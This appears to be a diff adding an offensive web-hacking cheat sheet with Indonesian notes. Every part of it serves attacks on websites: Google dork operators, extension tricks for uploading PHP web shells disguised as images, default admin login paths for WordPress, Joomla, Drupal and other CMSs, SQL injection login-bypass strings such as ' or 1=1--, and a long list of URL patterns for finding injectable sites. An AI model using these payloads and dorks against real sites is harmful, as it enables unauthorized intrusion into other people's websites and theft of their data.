@@ -1,0 +1,78 @@
+- "index of" + nama file (untuk mencari direktori dengan file tertentu).
+- "intitle:" + kata kunci (untuk mencari halaman dengan kata kunci tertentu dalam judul).
+- "inurl:" + kata kunci (untuk mencari halaman dengan kata kunci tertentu dalam URL).
+- "filetype:" + ekstensi file (untuk mencari file dengan ekstensi tertentu).
+- "site:" + nama situs (untuk membatasi pencarian pada satu situs web).
+
+Mengubah.php ke.jpg
+php phtml, .php, .php3, .php4, .php5, and .inc
+asp asp, .aspx
+perl .pl, .pm, .cgi, .lib
+jsp .jsp, .jspx, .jsw, .jsv, and .jspf
+Coldfusion .cfm, .cfml, .cfc, .dbm
+
+shell.php;.jpg
+shell.php.jpg
+shell.php..jpg
+shell.php.jpg
+shell.php.jpg:;
+shell.php.jpg%;
+shell.php.jpg;
+shell.php.jpg;
+shell.php.jpg:; 
+
+
+
+/// CMS login
+site-admin/login.php
+admin/page-login.php
+WordPress /wp-login.php
+Joomla /administrator
+Lokomedia /adminweb
+Popoji /po-admin
+Drupal /admin
+Magento /index.php/admin
+vBulletin /admincp
+
+inurl:/admin/login.php id=
+inurl /admin/login.php site
+inurl:login/administrator.php
+inurl:admin/addblog.???
+inurl:adminhome.php
+
+EEEE
+'or 1=1 limit 1 -- -+
+'=''OR'
+Email' or 1=1--
+
+
+/// dork sqli
+detail.php?id=23
+view_items.php?id=
+home.php?cat=
+item_book.php?CAT=
+www/index.php?page=
+schule/termine.php?view=
+goods_detail.php?data=
+storemanager/contents/item.php?page_code=
+view_items.php?id=
+customer/board.htm?mode=
+help/com_view.html?code=
+n_replyboard.php?typeboard=
+eng_board/view.php?T****=
+prev_results.php?prodID=
+bbs/view.php?no=
+gnu/?doc=
+zb/view.php?uid=
+global/product/product.php?gubun=
+m_view.php?ps_db=
+productlist.php?tid=
+product-list.php?id=
+onlinesales/product.php?product_id=
+garden_equipment/Fruit-Cage/product.php?pr=
+product.php?shopprodid=
+product_info.php?products_id=
+productlist.php?tid=
+showsub.php?id=
+productlist.php?fid=
+products.php?cat=
